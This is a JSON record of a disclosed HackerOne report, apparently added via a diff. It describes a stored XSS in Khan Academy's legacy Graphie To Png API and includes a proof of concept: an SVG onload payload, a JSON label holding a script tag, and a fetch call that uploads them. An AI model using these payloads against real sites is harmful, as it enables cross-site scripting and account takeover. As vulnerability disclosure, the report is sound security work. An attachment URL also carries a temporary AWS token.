@@ -1,0 +1,126 @@
+{
+  "id": 2846011,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODQ2MDEx",
+  "url": "https://hackerone.com/reports/2846011",
+  "title": "XSS on using the legacy \"Graphie To Png\" API",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-11-16T10:23:48.282Z",
+  "submitted_at": "2024-11-18T08:39:51.846Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sikn",
+    "url": "/sikn",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 134,
+    "url": "https://hackerone.com/khanacademy",
+    "handle": "khanacademy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Khan Academy",
+      "twitter_handle": "",
+      "website": "https://www.khanacademy.org/",
+      "about": "Start learning now. Completely free, forever."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-02-06T16:26:40.528Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-07T16:26:35.560Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "\nAn attacker can can upload malicious graphies via (http://graphie-to-png.kasandbox.org/) and (http://graphie-to-png.khanacademy.systems/) that exploit the graphie renderer.\nThe attack targets any page that has a graphie (`khanacademy.org`!!), as well as `cdn.kastatic.org` and `ka-perseus-graphie.s3.amazonaws.com`\n\n# Proof of concept\n## Step 1: Uploading a malicious graphie\nconsider the following example where https://ka-perseus-graphie.s3.amazonaws.com/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg is used in an article, we will override it by uploading the same JS but with malicious SVG and JSON data (because the hash is a hash of the JS).\n\n1. **Malicious SVG:** The SVG is modified to include a malicious `onload` attribute.\n```html\n<svg ... onload=\"alert('SIKN')\">...</svg>\n```\n2. **Malicious JSON:** A label is modified with `typesetAsMath: false`, causing the graphie renderer to inject our code to DOM. This is what will target `khanacademy.org`\n```json\n{\n\t\"labels\": [\n\t\t{\n\t\t\t\"content\": \"<script>alert('SIKN')</script>\",\n\t\t\t\"typesetAsMath\": false,\n\t\t\t...\n\t\t},\n\t\t...\n\t],\n\t...\n}\n```\n```js\nvar form = new FormData();\nform.append(\"js\", ORIGINAL_JS);\nform.append(\"svg\", XSS_SVG);\nform.append(\"other_data\", JSON.stringify(XSS_JSON));\n\nawait fetch(\"http://graphie-to-png.kasandbox.org/svg\", {\n    \"method\": \"POST\",\n    \"body\": form\n}).then(r=>r.text())\n```\n\n\n## Step 2: Wait patiently\nWait until cdn.kastatic.org updates its cache, for this example I had already prepared it by not caching the original graphie (https://cdn.kastatic.org/ka-perseus-graphie/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg)\n\nAs for the malicious JSON, using the devtools override feature to simulate an attack shows that it works:\n{F3766148}\n\n## Impact\n\nXSS on pages that use graphies, potentially leading to account takeovers.",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3766148,
+      "file_name": "POC.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m1x4ow876pfzkcfqqy07ynthpmg9?response-content-disposition=attachment%3B%20filename%3D%22POC.png%22%3B%20filename%2A%3DUTF-8%27%27POC.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQREMC7CON%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T173231Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCW8SxQKgARnLryAh2r4n3odN%2B7zqFhHLBFpGvgAn4XGQIhALV8j%2BDSVqm9UmUGt2DO4qp5pLHNIMOJpyo%2BQr4jZzIdKrsFCO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzz%2FcwnvkPCLs%2Bn6ygqjwV3N4a%2FZ0EATSX1wO%2Bd%2F9a4sFO6Mt858m3ydeh4j2%2BqqKgVb9fLUqWZQ3Xmx8UrY2Jf77ASqF10QqWvu5mjhlL%2F6cJVHqOqGfS1YHTxePFExVYWJW0mX9DONhiwDrcFQLe6DMPyTeYR9bFqemJKpl4W0Lq0mBgjk2J9L7vjh9lmdSMB4mW4bwDlytP%2B2OOXnfUPo0Ue3CLKUgn7VKZPMNGMod8rA1p1Nj2o8GDxDQz8S9B9GWeiNrQfKMx1j1yZzUmUiJWYYZg6VPKQd%2Fh6zYAbXPqMB%2B%2BeYrNZaOFzPzwOG7lz3sie7Zq7J2P4WTqz7cIDi8ljg%2BXpQNu1NXVgFuLw05lTmJyAurl8%2F7XqwxcAr%2F3WyKzTA%2BN3MidnphMoj9k0FIhqGYXLon9kWmvgmOuS2N%2Bi1Bz6dFV%2FFoCh0inpBfQQf6i10%2FwuwAsDIqOnV%2F%2BsA6UQx0nIY1BZz%2Fu43hkfkcs%2B4emD%2BwTox%2BXml7bT3PyhNAONbvlX%2BjYFGSsu7%2BIT82VvjaOHI4IsYtryLUHHku1lde74QudXzS5Am6sbCGdn28GddjTRySk0O1VctM8gf7kLszOuunYtzmI%2F60PGxa8%2FKfHIIzYH0xHPgB7ZyjWCrbq78RXvAoyRnfnKzgDeuPP6kt%2Fmw%2Bn55w2gkhfYV8yWgFq44AQd%2FO7GQhS6uYp0kYsYocWSYyXa8aaKrcll4f1tA6oisyBTb5pzXLwukKj8q7hpMQCyXrKYULgrq1rwLMpUhMi91AEHWm%2FLmP8LtrrYdGaptsjtLzHdKzyfuCGCmmDyXS2O7gkVx3S3TIPZ8BlVvBNPeFh%2FY2AILsegfWYoGHx2Q6h3aohdbdWqAHWRhkqdFirzl%2BWKCUAzMI3ausYGOrABMUFpfpVhbtSigmBVkvXCN%2FGp5olQ43QMjeJxuPdkJr0Fk%2FUK2lCX0avcZTMgAcB8v%2FQrrd3%2Bl%2BHr0R%2FBCDD9ZgoXNh5Bs%2Bt6BlNJOLEuPeXscn3g%2FxGeNJRbaq1iW9c2cGZgqYwCB4eSCi3VOE7kvGz8sbUTPOdQOuINtDKGv%2BBSVbxIVtIkLo0cDeLpp621mg%2F4Mrq6KjHRapHnYIEjGudjLEEElfe0kgRyJajdUUw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=349c90263e99ef9b8e97577425b8003b1bd8e657857b5f885cae7d603f71faa1",
+      "file_size": 121156,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-02-06T16:26:35.772Z",
+  "allow_singular_disclosure_after": -19530355.857991856,
+  "singular_disclosure_allowed": true,
+  "vote_count": 80,
+  "voters": [
+    "0xtarun",
+    "0xcyborg",
+    "aboalezz",
+    "pinkmeimei",
+    "kaenne",
+    "orange303",
+    "2026",
+    "thalaivar304",
+    "spaghettisec",
+    "mohaned0101",
+    "and 70 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
